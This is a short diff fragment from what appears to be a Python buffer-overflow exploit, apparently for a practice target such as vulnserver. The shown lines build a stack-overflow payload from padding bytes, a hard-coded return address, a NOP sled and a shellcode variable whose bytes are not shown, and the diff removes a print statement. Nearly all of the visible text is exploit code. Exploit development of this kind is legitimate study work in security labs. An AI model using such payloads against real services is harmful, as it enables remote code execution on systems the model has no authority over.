@@ -31,4 +31,3 @@ shellcode = (
 )
 overflow = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + shellcode
 
-print (str(overflow))
